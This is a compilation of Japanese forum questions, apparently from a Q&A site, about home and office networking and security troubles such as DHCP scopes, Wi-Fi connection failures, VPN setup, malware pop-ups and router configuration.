2週間ほど前にプロバイダを変えて以来、社内LANの1台のマシンから特定のサイトにだけ繋がらなくなってしまいました。 ネットワーク設定などは他のマシンと同じはずで、他のマシンからは問題なく接続できています。 OS:Windows 7 ブラウザ：IE、Firefox、Chromeで確認 IPv4 プロバイダ：bit-drive ■つながらないサイト http://www.nikkei.com/ http://www.enjapan.com/ ■確認したこと ping www.nikkei.com →OK。IPアドレスも間違いない。 telnet www.nikkei.com 80 →つながらない ・CentOSのLive CDで起動すると遅いけれど表示できる ■その他試したこと ・セキュリティソフト（ウイルスセキュリティ）を無効化 ・ipconfig /flushdns ・netshでMTU変更 ・基本DHCPですが、別のIPアドレスに固定で変更 ・ipconfig /release, ipconfig /renew ・ブラウザのキャッシュや履歴を全削除 ・確認用に立てたプロキシサーバを通すと表示できる これはいったいどんなことが考えられるでしょうか？
VMwarePlayerを利用してCentOS6を入れました。 ホストOSからゲストOSにteratermでSSHでログインができません。 「ネットワークに到達できませんでした」と表示があります。 CentOS側ではSSHは起動していて、ポートの22も開いていることを確認しています。 CentOSではブラウザでインターネットが見れています。 ホストOSからゲストOSへpingを飛ばすと、Destination net nureachableと表示されます。 ネットの接続方法はNATです。 他に何か設定すべきことはありますでしょうか。 ちなみに、iptableは止めても動かしても、接続できませんでした。 当方かなりの初心者です。 どなたかご教示お願いします。
PINGを1秒以下の間隔で断続的に送り続けることが可能なツールを教えて頂けないでしょうか？ フリーでもシェアでも構いませんm(__)m
お世話になっております。 本件興味があるため、質問させていただきます。 ポートは何故、65535が上限なのでしょうか。 2の16剰ということはわかるのですが、2の24剰などではない理由が知りたいです。 どなたかわかるかたご教示ください。
ホテルや飲食店で公衆無線ランサービスをしているところがあります。 パスワードなしでネットにつながるところがありますが、 これは野良APと同じくらいの危険性ということでしょか？ それとも個人とは違う公衆無線LANとしての 何かセキュリティ対策をしているのでしょうか？
パソコンはあまり詳しくない者です。 久々にパソコンを立ち上げてネットサーフィンをしていました。（アダルトサイト含む） 久しぶりなのでウイルスソフトの期限が切れている事に気づかず、ウイルスに感染したと思われます。 症状はパソコンを立ち上げるとデスクトップまでは行き、アイコンの表示も配置は違いますがいつも通りの表示です。しばらくするか何かファイルを開くと全てのアイコンが消え、マイコンピュータとIEとゴミ箱の三つしか無くなります。 他のプログラムも表示はあるのですが、ほとんど実行は不可能です。 似た症状のかたの投稿を見てシステムの復元を試みたのですが、（その方はそれで直っていた）C¥WINDOWS¥system32¥Restore¥rstui.exeが見つかりませんと表示され実行できません。 情けない事にバックアップもとっていなかった為に、初期状態に戻す事もできず非常に困っています。 家族の写真や動画や音楽ファイルもあったのですが、もう元には戻らないのでしょうか？ どなたかお助けのご教授頂ければと思います。 よろしくお願いします。 Microsoft Windows XP Home Edition Version2002 Service Pack 3 Norton（期限切れ）
あるホテルで証券会社のサイトにログイン後そのサイトの中をクリックしたら再度ＩＤ番号とログインパスワードをきいていました。今までこういった事は無かったので心配になりすぐにログアウトしてそのホテルでアクセスをやめました。ネット環境はランケーブルでネット接続、パソコンは自分のパソコン持参、この状態でパスワードは盗まれる可能性はありますか？？
現在Windows環境のネットワークが２つあります。 １・・インターネットに接続されたネットワーク 　　　（サーバーなし、固定IP、セキュリティソフトあり） ２・・インターネットに接続されていないネットワーク 　　　（サーバーあり、固定IP、セキュリティソフトなし） いずれも、業務で使用しており、 ２については、業務上特に重要なデータを管理するためのネットワークで あるため、インターネット接続をしていません。 したいこと。 ２のサーバーにあるデータベースの一部をCSVなどに抽出・加工し、 １のネットワーク上で使用したい。 この抽出したい情報とは、個人情報４情報程度の基本的情報です。 これは、１のネットワーク上でも現在使用されていますが、 ２で管理したものを使用することで、マスタを統一化できると 考えています。 考えたこと。 例えば、ファイアーウォールの設定やセキュリティソフト等を使用して １と２の間に中継PCを用意。LANアダプタを２つ用意して、 中継PC上で、それぞれセグメントを切り分ける。 抽出したデータを中継PCの共有フォルダに保存する。 １のネットワークから中継PCの共有フォルダの中に あるデータを取出し、都度フォルダの中は空にする。 もちろん実行時は、２のネットワークにはセキュリティソフトを導入。 聞きたいこと。 上記内容でセキュリティ的にどの程度問題があるか？ ウィルス混入の可能性はどの程度あるのか？ 他にいい方法があれば教えていただきたい。 繋がないのが一番いいのですが、どうしても２のサーバーにあるデータを 活用したいのです。 申し訳ありませんが、よろしくお願いします。
現在、ギガビットのルータとスイッチングＨＵＢをつなげて社内のＬＡＮが構築されてます。 構成としてはルータの下に親ＨＵＢが8台その下に子ＨＵＢが2,3台ついて そこから各社員の端末等につながっている状態です。 同一の子ＨＵＢ配下につながった端末同士でソフトによりファイル通信速度を計ったところ500Mbpsほど出ました。 その後、1台を親ハブ配下に移動し、元の子ハブ配下の端末との速度を計ったところ90Mbpsでした。 社により構成は異なるかと思いますが、ギガビットイーサのＬＡＮでは、この位は妥当な速度なのでしょうか？ 尚、現在50人ほどがつなげて1セグメントで利用している状態です。 速度改善のためにVlanやジャンボフレーム等を考えているのですが効果あるものでしょうか。
初めましてこんにちはっ。 私、以前hanyatyannと言う名で登録させていただいてたんですけど。 あっれー？。 おかしいなぁ？。 サインインできないんですよねー？。 なんでなんでしょうねー？。 パソコンとかって難しいですねー。 それはともかく。 皆さんに相談にのって欲しくって、来ちゃいました。 えっと。 某商業サイトのダウンロードクライアントをダウンロードしたんですけど、二つ有って、両方とも、家のパソコンに入れている、セキュリティーソフトに引っかかるんですよね。 「それはトロイの木馬です。」って。 そこでですね。 ＩＰＡ情報セキュリティ安心相談窓口って所に相談したんです。 「トロイの木馬入りソフトが有るのでこれお渡ししますので解析して下さい。」って。 そしたら、お返事がかーなーり遅くになってから「うちでもそこのサイトでダウンロードしたんだけど、ウイルス無かったよ。」なんです。 おかしいと思いませんか？。 もうそこの商業サイトではアップデートしたって書いてあるし、アップデートとダウンロードクライアントに関係無いとしても、いつまでも同じトロイの木馬をぼーっとつけ続ける犯罪者がいるとか思います？。 私だったら、検知されない最新の物に付け替えたり、データ集め終わったから外したりしますよ？。 私はトロイの木馬を渡しますってちゃんと書いたのに。 なんだか、日本語がわかんないのか、何考えてるのかまったく分からないし、薄気味悪くなっちゃってー。 ほかにはどうしようって、東京都生活文化スポーツ局広報公聴部情報公開課って所を見つけたんですけど、完全に無視されちゃって。 そこの局長の小林清って方に内容証明を送ったのに完全に無視なんです。 これどうしたら良いと思いますか？。 私ウインドウズとかちんぷんかんぷんなんですけど。 犯罪は放っておけないと思うんです。 このままじゃいけないと思うんですよ。 そこで皆さんにお知恵を拝借したいと思いました。 コンピュータとか良く分からない私にも優しく分かりやすいように教えて下さいね。 よろしくお願いします（ペコリ）。
Windows Server2003 R2のDHCPを利用しています。 IPアドレスを増やす目的で、サブネットマスクを変更しました。 変更前：255.255.255.0 変更後：255.255.252.0 DHCPの既存スコープを削除し、新たにスコープを作成し、範囲を192.168.1.20～192.168.4.200にしたところ192.168.4.の範囲はスーパースコープとなってしまいました。 スコープの範囲設定が192.168.1.20～ではなく192.168.0.20～が正しいのでしょうか？ よろしくお願いします。
会社の有線LAN接続されたCANONのＭＧ６３３０プリンタのIPアドレスが１６９．２５４．ＸＸＸ.ＸＸＸとなってます。DHCPの自動割り当てはoffになっているようです。今のところ一応、印刷はできます。 DHCPの自動割り当てがoffならば、IPアドレスが変わることもないと思いますが、この番号のまま使うことは何か問題がありますか？それとも192.168.000.100とかに固定しなおした方がよいのでしょうか？ プリンタの設定等は別の方がしましたが、Windous７はネットワーク上のプリンタを自動で探してくれなかったそうです。XPのほうは、ネットワーク上のプリンタを自動でさがしてくれたそうです。このこととIPアドレス１６９．２５４．ＸＸＸ.ＸＸＸは何か関連がありますか？逆にどうしてXPは探すことができたのでしょうか？１６９．２５４．ＸＸＸ.ＸＸＸと192.168.000.XXXは問題なく通信できるのものなのでしょうか？ あと、プリンタの印刷開始までの時間が長くなったと言っている人がいますが（私のパソコンからだと特に気になりませんでした）、プリンタの性能的なもので、IPアドレスや設定とかとの関連はないと思われますか？ 色々すいませんが、よろしくお願いいたします。
企業のメールアドレスを変更が必要になるのは、どのような時かがいまいち理解できておりません。 私が理解している登場人物は、下記になります。 1.ドメイン（メール）発行会社（どのようなサービス企業を指すのでしょうか） 2.外部DNSサーバー（MXレコード） 3.メールサーバー（メールBOX,外部MTA） 4.クライアントメーラー 1.を変更する場合にアドレスの変更が発生すると考えられますが、 1.の変更というのは実際どのような時に発生するのでしょうか。 （通常の.3だけでは発生しないと考えております。こういう理由のときに1.を変更する理由があるなど わかりますでしょうか。） また、以下私の見解あっていますでしょうか。 ・外部DNSをサービス業者のものを利用せず社内で構築した場合、何も設定しなくとも一般の人が 　ルートDNSより外部DNSで名前解決できますでしょうか。 ・WindowsにございますActiveDirectory環境のドメインとはまったく別のものでしょうか。 どうかお知恵をお貸し頂けますでしょうか。 宜しくお願い致します。
スリーブ状態が急に解除されＰＣが自動復帰しました。 スリーブ状態から自動復帰するまでの時間設定なんてありますかね？ windows7 Home premium 64bit Dell xps8300 カスペルスキーインターネットセキュリティ２０１３ を使っています。 電源オプションの設定で３０分ＰＣ操作をしないとスリーブ状態になるように設定しています。 スリーブ状態になっている状態で何時間か放置していたのですが マウス操作やキーボード操作など何もしていないのに たまたまＰＣの方を見ていた瞬間、スリーブ状態が解除されＰＣが立ち上がりました。 いきなり復帰したのでびっくりしました。 どこからかWOL信号が送られてきた？とまず疑ったのですがルータではＷＡＮ側からの WOL信号を内部に通すような設定はしていませんし、ＬＡＮ内の別の端末からＷＯＬ信号が送られたのかな？とも考えられるんですが、ＬＡＮ内の複数ある端末は自分しか使ってないのでありえないんですよね。 ルータはルータにログインすればＬＡＮ内の指定した端末にＷＯＬ信号する機能が搭載されたものを使っていますが、ルータにログインできるのは自分だけですし、ルータのポートポートフォワーディングなども 不要なポートはあけていませんし、自分のＰＣに不要なパケット転送するような設定もしていません。 スリーブ状態がいきなり解除される原因として他になにか考えられることはありませんか？ ちなみに使っているWindows7のソフトでスリーブを自動で解除するようなものは入れてないです。 不要なソフトはアンインストール、不要な常駐プログラムやサービスなども自分でちゃんと切ってあります。
社内にWi-Fiのアクセスポイント機器を設置し、社員にタブレット端末（SIMカード無しが14台）を配布してWi-Fi接続で運用したいと思っているのですが、繋がる端末と繋がらない端末があって困っています。 繋がらないときのメッセージは、「プライベートなIPアドレスが割り当てられました。接続が制限されています。」となります。 ◎アクセスポイント機器とその設定は下記の通りです。 機器：BUFFALO　WAPS-APG600H IEEE 802.11g 無線モード：11b/g/n、11b、11g、11nすべて試しました。 チャンネル：自動にしたりCh11にしたりしています。 チャンネルモード：20MHz チャンネル変更間隔：30分 BBS BasicRateSet：1,2,5,5,11Mbps ANY接続：有効、無効どちらも試しました。 プライバシーセパレーター：STAセパレーター 同時接続台数：25台 認証方式：WPA2-PSKとWPA-PSK／WPA2-PSKのどちらも試しました。 暗号化方式：AES キー更新間隔：60分 共有キー：設定済み MACアドレスによる制限：有効（端末を設定済み） AOSS、WPSは使用していません。 接続時のIPは動的（DHCP）です。 この機器は天井に貼付けています。すぐ近くに遮断する様なものは有りません。 SSIDと共有キーの入力間違いもありません。 ※セキュリティー（WPA2-PSK）を設定しないパターンも試してみましたが繋がりませんでした。IEEE 802.11aでもダメでした。 ◎タブレット端末と接続の現状は下記の通りです。 ・ARROWS Tab LTE　F-01D（6台のうち3台繋がらない） ※ずっと繋がらない端末、ずっと繋がっている端末、最初は繋がっていたが繋がらなくなった端末、最初は繋がらなかったがあとから繋がるようになった端末があります。 ・GALAXY Tab7.7 Plus　SC-01E（5台のうち3台繋がらない） ※最初は5台とも繋がっていた ・GALAXY Tab10.1 LTE　SC-01D（3台とも繋がる） ※今のところすべて繋がる ◎別のアクセスポイント機器でも試してみました。（場所は同じ社内で、回線も同じです） ・MZK-SA300N2（同時接続台数不明、チャンネルはCh5） ※同時に接続する台数を1,2台で試してみましたが「WAPS-APG600H」と同じ状況で繋がらない端末は繋がらない、繋がる端末は繋がる。 ・Web Caster W100（同時接続台数4台、チャンネルはCh1） ※同時に接続する台数を1,2台で試してみましたが「WAPS-APG600H」と同じ状況で繋がらない端末は繋がらない、繋がる端末は繋がる。 ・docomo L-09C（同時接続台数不明） ※繋がるときと繋がらないときがあります。ON／OFFを7,8回繰り返していると繋がります。 ※すべて「WAPS-APG600H」と同じような設定にしています。 ◎自宅でも試してみたらあっさり繋がりました。 自宅はAirMacを使用しています。セキュリティーはWPA2です。問題なく繋がりました。 会社のアクセスポイント機器を持ち帰って、自宅の回線に接続して会社の設定のまま試してみてもあっさり繋がりました。 別の2人の自宅でも試してもらいましたが、2人とも繋がったようです。 タブレット端末もアクセスポイント機器も悪くなさそうなので、原因は同時に接続しようとし過ぎなのでしょうか？社内の環境が悪いのでしょうか？ どなたか良きアドバイスをお願いしますm(_ _)m
「パスワードを忘れた？」をクリックしてマインダーを送信してもらったところまでは分かったのですが、メールに送られてきたURLをクリックするとtwitterのホームが出てくるだけなので、この先からどうやってパスワードを再発行すればいいのかわかりません！馬鹿な私にもわかりやすいような説明をお願いします！ 助けてください！ カテ違うかもしれませんが、よろしくお願いします。
よろしくお願いします。 50人程度の会社の管理をしています。 以下のセキュリティ関連のインシデントが発生しており、対策を考えています。 １．社内で資源登録外のネットワーク機器（特に無線機器）が持ち込まれる ２．DHCPサービスが社内で不正に起動され、社内PCがそちらからIPを取得してしまう 両者の関連性は不明ですが、１の結果、２が発生したことも考えられます。 Q1. 「１」について、「不正に持ち込んだ機器を社内LANに接続させない」、または接続した際に 「アラートを発生させる」ソリューションはありますでしょうか？。 Q2. 「２」について、不正なサービスが起動された時点で、その起動したPCの特定などをする 方法はありますでしょうか？。 ご意見を頂けると助かります。
インテリジェントスイッチのSTPは、STPを持ったスイッチ間のループを検出・防止する機能で、 その配下にある普通のスイッチングハブ（量販店に数千円で売っているような）のループまでは 検出・防止できない、という理解で合っているでしょうか。 そうだとすると、インテリジェントスイッチ配下に普通のスイッチングハブを接続し、そこでループが 起こった場合、そのハブの配下でブロードキャストストームが起こると思うのですが、 インテリジェントスイッチ配下の他のハブや端末にもブロードキャストストームは波及しますか？ インテリジェントスイッチで、それを防ぐ機能はないでしょうか。
会社のパソコンに、キーロガーがインストールされています。 社内のネットワークの管理者がインストールしたようです。 5年も前からインストールされていたようなのですが、まったく気づかずに、最近になってようやく気づきました。 これは犯罪ではないのでしょうか？ 犯罪ではないとしても、終始監視されていてとても不愉快です。
RSA暗号はべき乗と剰余で暗号化するのですから、同じＮとＥを使い続けてたり長文を暗号化したりすると統計的手法で解読されてしまうのではないでしょうか。
メールの添付ファイルが「ダウンロード」できなくなりました。 解決をおしえてください。
IPアドレスを偽装するソフトは「vpn 無料」とかで検索すればたくさん出てきますが、 日本の、東京以外（例えば仙台とか岡山とか）のIPアドレスに偽装することができるサービス等は存在するでしょうか。 ご回答よろしくお願いします！
次のような状況でスマホのmacアドレスを取得することは可能ですか？ 先日skypeから電話番号に着信がありました。 相手の番号は0000と出ていました。 電話に出てしまったのですがすぐに切られました。 すぐに非通知着信拒否の設定をしましたが このような状況でスマートフォン自体の macアドレス（固体識別）を抜かれる危険はありますか？ セキュリティは無料ですがlookoutというものを入れています。 osはandroid4.1です。 また、ケルベロス系のアプリで注意したほうがいいものは他にありますか？ 具体的な対策方法などありましたら知りたいです。 よろしくお願いいたします。
会社で方法セキュリティ担当になりましたが、右も左もわかりません。 ６月に社員に研修会を行わなければならなくなりました。 規則・規定はすでにあります。内容的には理解できるのですが、技術的な事を質問された場合 よくわかりません。 あと半月、どのような本を読めばよいかご教授ください。
ITエンジニアです。英語の勉強をしたいので、海外の技術系サイトなどを購読したいと思っています。@ITやIT mediaのようなサイトはないでしょうか？ それをきっかけに海外の事情をキャッチアップしたいと思っています。分野はネットワークとセキュリティです。
　NETWORK（LANケーブルの接続）について質問致します、宜しくお願い致します。 　無線ルータ－から有線でハブに接続、ハブからPC、ハブからプリンターをそれぞれ （有線で）接続しています。 　先日ハブ～プリンター間を長くするため、LANケーブルを長いものに取り換えたとこ ろハブが認識しませんでした。 　ハブ～PC間は問題ないのですが、ハブ～プリンター間がLANケーブルによってはハ ブが認識しない場合があります。 　クロスケーブルかなと思って、新品のストレートケーブルを購入してもやはり認識しま せん。 　（認識しなかったLANケーブルの結線状況を確認すると、どうもストレートケーブルの ような結線になっているみたいなのですが？？？？） 　これは何が原因でしょうか。 　ハブ～プリンター間の使用するLANケーブルの種類は、ストレートケーブルで問題ない はずですが。 　以上宜しくお願いします。
ある会社のサイトで無料でホームページが作成できる、ということで非公開を条件に試作してみました。 ところが数日後ある言葉を検索していたらいきなりこの試作中の私のホームページがサイトで表示されました。 まだ準備中なのにＳＥＯも申し込んでいないのにこんなことってあるのでしょうか？ 情報漏えいとプライバシー侵害に当たると思うのですが、一度公開してしまったサイトは削除することはできないのでしょうか。 この会社にメールで問い合わせてから３日経つのですが未だ回答が来ません。
会社に警備システムがついているのですが、解除の仕方を間違えてしまい警備会社(ＣＳＰ)に連絡がいってしまいました その後 警備会社の方が来て警報は解除され、 用紙に所属と名前を書いてお帰りになりました この場合、警備会社から会社に連絡はいくのでしょうか
apache サーバーを立てて、プロバイダAで公開してきました。今回プロバイダBを追加契約しまして、２回線で公開したいと思います。 プロバイダAとフレッツ光のブロードバンドルーターがeth0 に繋がっています。プロバイダBと光BBユニットがeth1 に繋がっています。セグメントは異なるんですね。 A eht0 192.168.1.5/24 B eth1 192.168.2.5/24 デフォルトのゲートウェイはフレッツ光のブロードバンドルーターです。 プロバイダAから来るリクエストに対するレスポンスは問題ないんと思います。プロバイダBから来るリクエストに対して、プロバイダAからレスポンスを送り返すのはおかしな話ですよね。きっとそういうのは相手も（自分も）持つルーターでDROP されますよね。 またApache のログにはリクエストの発信元（グローバルIP) が残るんですから、ポートフォワードではSNATされてないんでしょうね。やはりデフォルトのゲートウェイを通してレスポンスする事になりそうです。 こういう場合は、どうしたら良いんでしょうか。 今思いついたのはsquid ではどうかなという考えです。しかしこれだと相手のグローバルIP は見えなくなりますよね。または eth0 およびeth1 のそれぞれに対応してサーバーを２台用意する。 他に思いつくのはiptables でSNAT でしょうか。 イマイチ理解がまとまりません。なにか抜けてるような。詳しい方、どうかご教授くださいませ。
現在、我が家では父親がＮＴＴの契約者でフレッツ光ネクスト（ファミリーハイスピードタイプ）に加入しております。 そして兄貴があるプロバイダーの契約者でフレッツ光を利用、、自分もインターネットがしたいと思ってるのですが、 今ある家のＯＮＵを使用して自分個人名義で新たにプロバイダー契約して接続することは可能なのでしょうか？？ ネット関連にあまり詳しくないので初心者でもわかるように教えていただけたら光栄です。 新たにプロバイダー契約できるとしたら、また新たに工事が必要になってくるのでしょうか？
sage body現在使用しているパソコンが「イギリス警察」を名乗る団体に、 完全にブロックされてしまい、使用ができない状態になってます。 インターネットで標記と同様の検索をすると、 以下のＵＲＬにたどり着きました。 http://www.pcrisk.com/removal-guides/7035-united … こちらに従うと、 駆除用のソフトウェアをダウンロードしなければならないみたいですが、 そのソフト自体も、ネットで検索してみると、怪しいソフトだと書いてありました。 若しくは、下記のＵＲＬのとおり、 http://blog.yoocare.com/united-kingdom-police-uk … ダウンロードせずに操作で解決する方法のＵＲＬを見つけましたが、 専門的すぎて内容がわかりません。 同じようなにイギリス警察ウイルスに感染されてしまい、 その駆除をしたことがあるという方がいらっしゃいましたら、 その方法を教えていただけないでしょうか。
実は今日の朝まで使えていたWi-Fiが夕方急に使えなくなりました。理由は分かりません。どんなにWEPキーを入力してもWi-Fiにつながりませんでも3DS以外ならつながりますどういうことなんでしょうかなるべく早く解答お願いします！
メールに於いてパスワードが変更されましたと送信あり 本題はここから入りますが、現在使ってる IPアドレスの番号が違い 推定位置情報も違い それでパスワードを4～5回変更をしているのですが 3～4行目のままです これは誰かに誘導をされているのでしょうか 至急アドバイスお願いします。
現在、ルータで２台(１台サーバ)のPCを繋げています。 プロバイダ情報をルータ(Corega)で設定しており、開放しているポートでどのマシンにアクセスするか判別しています。 そこで、質問なのですが。 サーバをもう一台ホストも違うものを増設したいのですが、やはりプロバイダなどの接続情報は個別PCに持たないといけないのでしょうか？ ちなみに今サーバ運用している一台のDNSサーバ情報もルータで設定しています。
バッファローのWMR-300買って、連休の外泊先で無線で通信しようと 思っていたのですが、無線で接続できません。今は有線接続していま す。 Windows7が入ったLenovoのPCです。自宅では普通に無線接続して 使ってますのでパソコン側は大丈夫のはず。 SSIDを選んで、パスコードが要求されて出てくるので本体裏に記載さ れているものを入力していますが、何度やっても失敗します。これは 初めての体験でちょっと戸惑い中。 うらのシールに貼ってあるパスコードとフラッシュメモリーのなかに書 き込まれている初期のパスコードが不一致しているとしか思えないの ですが、そんなことある？？
ciscoのコンフィグについてご教示ください。 service timestamps行のオプションにあるlocaltimeですが、 このオプションを有効にする時と、そうでない時はタイムスタンプ表示のされ方はどう違ってくるのでしょうか。 対象行は以下の２行になります。 service timestamps debug datetime msec service timestamps log datetime msec localtimeがあると機械自身の時刻が反映されるという事で、イメージがわきますが、 ない場合は、いったいどこの時刻が元になるのでしょうか。 実機検証ができる環境が手元になく、ネットで調べてもピンと来る情報得られずにこちらで質問させて頂いています。 よろしくお願いいたします。
金融機関などの自分の口座にログインするときセキュリティボードを使いますかと聞かれますが、一般にインプット情報はどの時点でどうやって盗み取られるのでしょうか？ これを使うとなぜ安全なのでしょうか？　またSPAM Mailを送ってくる人はこちらのメールアドレスをどのようにして調べ知ることだ出来るのでしょうか？
単一換字暗号ですが、英語文章の場合は、 isやtheやtoみたいに、スペースや文字の長さや頻度から少しずつ粘ればできるかとおもうのですが、日本語のローマ字（ko re ha pe nn de suのような) で、かつスペースがない（母音と母音子音複合の音と区別がつかない）場合は、どのように解読していけばよいのでしょうか。 とりあえず頻度表を書いて、上位にa,i,u,e,oなどの母音がくるのかなと漠然と考えるくらいしか方法がうかびません。解読のためのアルゴリズム（力技でもかまいません）やコツがあれば教えていただけませんでしょうか
iphoneからVPNを張るために、PPTPサーバーのみを目的として、 BUFFALOルータ(WHR-300)を設置しましたが、うまくいきません。 ＜構成＞ internet(NTT東光ネクスト)--IX2015--WHR-300 [IX2015] 　・WAN側はISPのPPPoEクライアント 　・LAN側は192.168.0.254/24 　・NAPT有効 　・1723/47番ポートともに、後述の192.168.0.1へポートマッピング。 　・アクセスリスト等はなし。 [WHR-300]※ルータモード(ルータモードでないとPPTPサーバー機能が無効化されるため。) 　・WAN側はケーブル挿さず 　・LAN側Iは192.168.0.1/24 　・PPTPサーバー有効、サーバIPアドレス等はデフォルト値。 　・PPTPユーザ情報は登録済み ＜補足＞ 　・IX2015にはPPTPサーバがないため、PPTPサーバ機能のみの為に 　　このBUFFALOルータの設置しました。(WLANAP用途もありますが・・・) ＜質問＞ 　1.iphoneのVPN機能より、PPTPサーバ(診断君で出ているグローバルアドレス)へ 　3G経由で接続を試みましたが、「サーバが応答しませんでした...」とのメッセージです。 　何がいけませんでしょうか？(iPhoneの設定は色々試しています。) 　2.iPhoneから宅内機器へのVPN接続を考えています。 　　1.が技術的に不可能の場合、IX2015の機能で代用できますか？(IPsec？？) よろしくお願いいたします。
今ネットワークの設計と構築を行っており添付のとおり設計してます アクセスはHTTPSでFWのWAN側のIPにアクセスし その通信をNATしてリバースプロキシに向け リバースプロキシがURL毎に該当のサーバーに振り分けます。 このとき戻りのパケット（ウェブサーバーからの応答パケット） はFWに行くのでしょうか？ 当方リバースプロキシサーバーの知識がなく よくわかりません。汗 （担当の人はいけると言ってるのですが、、、） サーバーのデフォルトゲートウェイはFWに向いているのですが この場合だとNATテーブルにないためパケットが破棄されてしまうのでは？ と思っています。 知識のある方お知恵をお貸しください。
最近、ＩＥの画面に、「今すぐダウンロード、コンピュータに感染ファイルが見つかりました。　今すぐ無料で修正。重要なメッセージ　パソコンを修復して下さい。」等のポップアップが頻繁に表れるようになりました。これの消し方を教えていただきたく、よろしくお願いします。 ちなみに、レジストリが書き換えられているのではとも思い、フリーのレジストリクリーナーソフトをインストールして走らせましたが、効果はありませんでした。 ＯＳはWiondows７、ＩＥはVerision９　です。 よろしくお願いします。
最近のネットワーク機器にはルーターの機能を有したFWやL3スイッチなどがございます。 どの機器をどのようにして使うべきかについて、3点質問をさせてください。 1.ルーターとルーター機能のあるFWを併用する（ルーターでインターネットの出入り口を受けて、FWに転送する）メリットはございますでしょうか。 2.１つのルーターにWANポートが2つあった場合、２つの回線（グローバルIP）を持たせることは可能でしょうか。 3.拠点間との接続にIP－WANを設定している場合、VPNとインターネット回線を１つのルーターで併用することは技術上は可能でしょうか。（機能が備わっていたとして）また、その場合注意すべき点（パフォーマンス低下、1台壊れるとなにもつなげなくなる）が他にございましたら、教えて頂ければと思います。 アドバイスの程、宜しくお願い致します。
ご閲覧ありがとうございます パソコン初心者です。 先日からパソコンの回線速度が110kほどになってしまい、ネットを開くのにも30秒ほどかかってしまいます 別のパソコンでは回線速度は安定して5～7Mあります RWINの設定などを変えてみましたが改善しません どうすれば元の状態に戻せますか… Windows xp ADSL10Mのプラン 現在のRWIN値:131070 です。
客先のモバイルPCに対して、VPNソフト（NET-G）をインストール・設定したのですが、 VPNソフトを起動すると、モバイルルータ（Docomoクロッシー）による通信ができません。 VPN通信はもちろん、ネット接続も不可能です。 VPNソフトをOFFにすると、通信可能です。 このような場合、どんな原因が考えられますでしょうか？ 【補足】 客先のVPNルータの設定（インターネット接続、VPNの受け口設定等）は私がしました。 今まで、VPNルータ同士のVPN接続の設定は経験があるのですが、VPNソフトの設定は 今回が初めてです。VPNソフトの設定は、前任者が作成したマニュアルに沿って行いました。 事前に、弊社内の未使用の光回線を使って、弊社VPNルータ←→NET-G+どっかのモバイルルータ での接続テストを行い、前任者のマニュアルの内容の妥当性を確認しました。 また、別の客先（＝クロッシー以外の通信）での経験もあります。 よって、NET-Gとクロッシーの同居がうまくいかないことに戸惑っているのですが・・・。
マイクロトレンドのパスワードマネージャをインストールしています。無料バージョンです。使い方もわからず、何がいいのか分からず、特に今は変わったことがわからないです。
テラタームを使って、ホームネットワークに繋いだAQUOS　BDをIPコントロールしようとしています。 接続はできるようなのです。が、login入力で、キーボードがまったく効かなくなってしまいます。 何か設定が悪いのか、なんなのか、さっぱり解りません。 テラタームでは、ダメなのでしょうか? 他に良いターミナルソフトはあるのでしょうか? おわかりのかたおりましたら教えて下さい。 よろしくお願いします。 Win7Pro/64bit PC は自作 無線LAN 親機経由で繋がっています。 ポートは、25000にしました。適当に決めました。
小さい会社ですが、社内のシステムの運用を担当することになりました。 現在ですが、ユーザのPC２０台とサーバが、192.168ｘｘのプライベートアドレスで 同一セグメントに属しています。 サーバはWindows2008でファイルサーバ、社内ポータルサーバ（IIS、MSSQL）です。 クライアントはWindows7です。 サーバは直接インターネットに接続はされていません。 業務として現状特に問題は無いのですが、ユーザのPCとサーバは 一般的にセグメントを分けたほうが良いものなのでしょうか？。 ※例えばセキュリティの問題などで
IPv6 のIPoE について勉強しています。 IPv4 と違い、IPoE ならプロバイダを経由しないので、プロバイダのバックボーンに左右される事なく速度が上がると考えついたんですが、合ってますか？
ネットワークの本でWANと接続する際に「ONU」という機器が 図であるのですが、これはどういった際に必要となるのでしょうか？。 ONUを使用せず、ルータから直接WANに接続するケースもあり、 違いを知りたくご質問をさせて頂きました。 よろしくお願いします。
会社のPC（メールアドレス）から 携帯にメールを送信した場合、インシデントのリスクはありますか？ もし過去に情報漏洩の事例がありましたら 教えて下さい。
パスワードの変更をするのに、以前のパスワードを入れてもエラーになります。 今まで何回か登録のパスワードを入れてもエラー表示されてしまっています。 そんな時は数日経過したのち、登録のパスワードを入れると、受け付けていましたので、今回パスワード変更のときもパスワードエラーが出たので、何日かしたらいいだろうと思い、日にちが経過してから見てみると、ロックされていました。 登録パスワードを入れてもエラーが出てしまうので、パスワード変更の手続きができません。このままだと、ブログ自体消去されてしまうのでしょうか？
進路について教えてください。噂では大企業や役所などが意外にハッカー攻撃に弱いらしいです。またハッカーコンクールみたいなのがあり優秀な人はリクルートされるとか。サイバー攻撃から社会を守る仕事に就くにはどういった大学に進学したらよいですか。あまり才能がない場合どういった企業に就職できますか。こういった仕事は収入や社会的地位はどうでしょうか。
先般、大手の会社を退職したある人が、自身のブログに書き込まれた厳しいコメントのIPを調べたところ、退職した会社側のIPが大半であったというニュースがありました。 質問です。 あんな大手であっても、掲示板等への書き込みが制限されていない会社は結構あるのでしょうか。 もしくは、会社のPCでも社外からは書き込み可能とか、管理職などは書き込み規制対象外とか。 彼らの痴話よりそちらに興味があります。 私の勤めている会社は小さいですが、イントラ接続のPCからは書き込みできません。外部に持ち出すPCもありますが、職務上触れられないのでわかりません。 両方ともソリティアすら入ってません…。
テラタームでサーバー起動中に、プリンタが毎回起動してうざい。 いちいちキャンセル押すのが大変。 どうにか打開できないものか。。。 質問に対して、質問してくるような人は解答できないので、いちいちバージョンはいくつですかとか、Linuxですかとか聞かないでもらいたい。 対外そういう人はまともな答えを出しているのを見たことがなwww
